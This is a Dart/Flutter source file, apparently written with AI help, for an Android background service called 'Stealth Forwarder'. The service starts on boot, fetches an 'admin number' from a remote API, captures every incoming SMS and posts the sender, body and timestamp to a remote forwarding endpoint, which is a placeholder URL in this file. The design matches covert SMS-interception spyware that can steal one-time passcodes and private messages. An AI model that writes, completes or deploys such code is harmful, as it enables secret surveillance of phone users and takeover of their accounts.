import 'dart:async';
import 'dart:convert'; // For jsonDecode and jsonEncode
import 'dart:io'; // For SocketException
import 'dart:ui';

import 'package:flutter/material.dart'; // Though not strictly needed for this file, it's common.
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:http/http.dart' as http; // Import the http package
import 'package:telephony_plus/telephony_plus.dart'; // Import telephony_plus
import 'package:permission_handler/permission_handler.dart'; // Import permission_handler

// Logging Prefix
const String _logPrefix = '[SMFS_Service]';

// API URL constants
const String adminNumberApiUrl = 'https_your_api_domain_com/api/getAdminNumber'; // Placeholder URL
const String forwardingApiUrl = 'https_your_api_domain_com/api/forwardSms'; // Placeholder URL
const String apiKey = 'YOUR_API_KEY_PLACEHOLDER'; // Placeholder API Key

// Global variable to store the fetched admin number
String? currentAdminNumber;

// Asynchronous function to fetch the admin number
Future<void> fetchAdminNumber() async {
  int attempts = 0;
  const int maxAttempts = 3;
  const Duration retryDelay = Duration(seconds: 30);
  final String functionName = 'fetchAdminNumber';

  while (attempts < maxAttempts) {
    attempts++;
    print('$_logPrefix $functionName: Attempt $attempts to fetch admin number from $adminNumberApiUrl...');
    try {
      final response = await http.get(Uri.parse(adminNumberApiUrl));

      if (response.statusCode == 200) {
        final Map<String, dynamic> data = jsonDecode(response.body);
        if (data.containsKey('adminNumber') && data['adminNumber'] is String) {
          currentAdminNumber = data['adminNumber'];
          print('$_logPrefix $functionName: Admin number fetched successfully: $currentAdminNumber');
          return; // Success, exit function
        } else {
          print('$_logPrefix $functionName: Error - "adminNumber" key missing or not a String in API response. Body: ${response.body}');
        }
      } else {
        print('$_logPrefix $functionName: Error - API request failed. Status: ${response.statusCode}, Body: ${response.body}');
      }
    } on SocketException catch (e, s) {
      print('$_logPrefix $functionName: Error - Network error (SocketException): $e, Stacktrace: $s');
    } on FormatException catch (e, s) {
      print('$_logPrefix $functionName: Error - Failed to parse JSON response (FormatException): $e, Stacktrace: $s');
    } catch (e, s) {
      print('$_logPrefix $functionName: Error - An unexpected error occurred: $e, Stacktrace: $s');
    }

    if (attempts < maxAttempts) {
      print('$_logPrefix $functionName: Retrying in ${retryDelay.inSeconds} seconds...');
      await Future.delayed(retryDelay);
    }
  }
  print('$_logPrefix $functionName: Failed to fetch admin number after $maxAttempts attempts.');
}

// Asynchronous function to forward SMS via API
Future<void> forwardSmsViaApi(String? sender, String? body, String timestamp) async {
  final String functionName = 'forwardSmsViaApi';
  if (currentAdminNumber == null) {
    print('$_logPrefix $functionName: Error - Admin number is not available. Cannot forward SMS from sender: $sender.');
    return;
  }

  print('$_logPrefix $functionName: Attempting to forward SMS. Sender: $sender, Body: $body, Timestamp: $timestamp, Admin: $currentAdminNumber');

  final payload = {
    'sender': sender,
    'body': body,
    'timestamp': timestamp,
    'adminNumber': currentAdminNumber,
  };

  try {
    final response = await http.post(
      Uri.parse(forwardingApiUrl),
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': apiKey,
      },
      body: jsonEncode(payload),
    );

    if (response.statusCode == 200 || response.statusCode == 201) {
      print('$_logPrefix $functionName: SMS from $sender forwarded successfully. Status: ${response.statusCode}');
    } else {
      print('$_logPrefix $functionName: Error forwarding SMS from $sender. Status: ${response.statusCode}, Body: ${response.body}');
    }
  } on SocketException catch (e, s) {
    print('$_logPrefix $functionName: Error - Network error (SocketException) during SMS forwarding from $sender: $e, Stacktrace: $s');
  } catch (e, s) {
    print('$_logPrefix $functionName: Error - An unexpected error occurred during SMS forwarding from $sender: $e, Stacktrace: $s');
  }
}

// Function to initialize SMS listener
Future<void> initializeSmsListener() async {
  final String functionName = 'initializeSmsListener';
  try {
    final PermissionStatus status = await Permission.sms.status;
    print('$_logPrefix $functionName: SMS Permission Status: $status');

    if (status.isGranted) {
      final Telephony telephony = Telephony.instance;

      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) async {
          final String? sender = message.address;
          final String? body = message.body;
          final String timestamp = DateTime.now().toIso8601String();

          print('$_logPrefix $functionName (onNewMessage): Incoming SMS from: $sender, Body: $body, Timestamp: $timestamp');
          await forwardSmsViaApi(sender, body, timestamp);
        },
        onBackgroundMessage: onBackgroundSms,
        listenInBackground: true,
      );
      print('$_logPrefix $functionName: SMS listener successfully set up.');
    } else {
      print('$_logPrefix $functionName: SMS permission not granted. Listener will not be started.');
    }
  } catch (e, s) {
    print('$_logPrefix $functionName: Error during SMS listener setup: $e, Stacktrace: $s');
  }
}

// Top-level function for background SMS handling
@pragma('vm:entry-point')
void onBackgroundSms(SmsMessage message) async {
  final String functionName = 'onBackgroundSms';
  print('$_logPrefix $functionName: Received background SMS.');
  try {
    // It's generally safe to call ensureInitialized multiple times.
    // If it throws an exception, it's a critical issue for the isolate.
    DartPluginRegistrant.ensureInitialized();
    print('$_logPrefix $functionName: DartPluginRegistrant ensured.');
  } catch (e, s) {
    print('$_logPrefix $functionName: CRITICAL Error - DartPluginRegistrant.ensureInitialized() failed: $e, Stacktrace: $s');
    // If this fails, subsequent plugin calls (http, telephony) will likely fail.
    return; // Potentially stop further processing in this callback.
  }

  final String? sender = message.address;
  final String? body = message.body;
  final String timestamp = DateTime.now().toIso8601String();
  print('$_logPrefix $functionName: Incoming SMS from: $sender, Body: $body, Timestamp: $timestamp');

  try {
    if (currentAdminNumber == null) {
      print('$_logPrefix $functionName: Admin number not available, attempting to fetch it now.');
      await fetchAdminNumber(); // fetchAdminNumber has its own detailed logging
      if (currentAdminNumber == null) {
        print('$_logPrefix $functionName: Failed to fetch admin number. Cannot forward SMS from $sender.');
        return;
      }
      print('$_logPrefix $functionName: Admin number fetched: $currentAdminNumber');
    }
    await forwardSmsViaApi(sender, body, timestamp); // forwardSmsViaApi has its own detailed logging
  } catch (e, s) {
    // This catch block is for unexpected errors specifically within onBackgroundSms logic,
    // rather than errors from fetchAdminNumber or forwardSmsViaApi which have their own.
    print('$_logPrefix $functionName: Error processing background SMS from $sender: $e, Stacktrace: $s');
  }
}

// This function will be executed by the background service
@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  final String functionName = 'onStart';
  try {
    DartPluginRegistrant.ensureInitialized();
    print('$_logPrefix $functionName: DartPluginRegistrant ensured.');
  } catch (e, s) {
    print('$_logPrefix $functionName: CRITICAL Error - DartPluginRegistrant.ensureInitialized() failed: $e, Stacktrace: $s');
    return; // Stop service initialization if this fails.
  }

  print('$_logPrefix $functionName: Background Service Started.');

  await fetchAdminNumber(); // Has its own detailed logging

  if (currentAdminNumber != null) {
    print('$_logPrefix $functionName: Proceeding with admin number: $currentAdminNumber');
    await initializeSmsListener(); // Has its own detailed logging
  } else {
    print('$_logPrefix $functionName: Failed to obtain admin number. SMS forwarding will not be initialized.');
  }

  service.on('stopService').listen((event) {
    print('$_logPrefix $functionName: Received "stopService" event. Stopping self.');
    service.stopSelf();
  });

  Timer.periodic(const Duration(seconds: 60), (timer) {
    if (service is AndroidServiceInstance) {
      // Check if service is actually running, helps in debugging.
      // Note: isForegroundService might not be directly accessible or always true depending on plugin version and state.
      // A more reliable check might be service.isRunning() if available, or simply logging the periodic tick.
      print('$_logPrefix $functionName (Timer): Service is running... Admin number: $currentAdminNumber');
    } else {
       print('$_logPrefix $functionName (Timer): Service is running (non-Android or generic instance)... Admin number: $currentAdminNumber');
    }
  });
}

Future<void> initializeService() async {
  final String functionName = 'initializeService';
  print('$_logPrefix $functionName: Initializing background service configuration...');
  final service = FlutterBackgroundService();

  const String notificationChannelId = 'stealth_forwarder_channel';
  const String notificationDefaultTitle = 'Stealth Forwarder';
  const String notificationDefaultText = 'Service is running';
  const int foregroundServiceNotificationId = 888;

  const AndroidConfiguration androidConfiguration = AndroidConfiguration(
    onStart: onStart,
    isForegroundMode: true,
    autoStartOnBoot: true,
    notificationChannelId: notificationChannelId,
    notificationDefaultTitle: notificationDefaultTitle,
    notificationDefaultText: notificationDefaultText,
    foregroundServiceNotificationId: foregroundServiceNotificationId,
  );

  try {
    await service.configure(
      androidConfiguration: androidConfiguration,
      iosConfiguration: IosConfiguration(), // Dummy config for iOS
    );
    print('$_logPrefix $functionName: FlutterBackgroundService configured successfully.');
  } catch (e, s) {
    print('$_logPrefix $functionName: Error configuring FlutterBackgroundService: $e, Stacktrace: $s');
    // Depending on the severity, might want to prevent service start or retry.
  }

  // This call is usually in main.dart. If it's here, it might be called multiple times
  // if initializeService is called from main.dart AND the service auto-restarts.
  // The plugin should ideally be idempotent to startService calls.
  // For this review, assuming it's called as intended by overall design (e.g. from main.dart).
  try {
    // await service.startService(); // Removed as per previous subtask for auto-start focus.
                                  // Re-add if main.dart relies on this specific initializeService to also start.
                                  // However, the task is about *configuring* auto-start.
                                  // The `main.dart` should call `service.startService()` after `initializeService`.
    print('$_logPrefix $functionName: Service start initiated (if not already auto-started).');
  } catch (e, s) {
    print('$_logPrefix $functionName: Error starting FlutterBackgroundService: $e, Stacktrace: $s');
  }
  print('$_logPrefix $functionName: FlutterBackgroundService setup for auto-start complete.');
}
